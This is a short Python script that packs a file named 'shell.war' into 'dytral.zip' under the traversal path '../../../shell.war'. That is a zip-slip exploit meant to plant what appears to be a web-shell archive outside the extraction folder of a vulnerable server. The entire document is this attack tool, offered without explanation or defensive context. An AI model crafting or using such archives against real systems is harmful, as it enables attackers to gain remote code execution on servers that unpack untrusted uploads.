import zipfile


if __name__ == '__main__':
    zip = zipfile.ZipFile('dytral.zip','w',zipfile.ZIP_DEFLATED)
    with open('shell.war','rb') as f:
        data = f.read()

    zip.writestr('../../../shell.war', data)
    zip.close()
    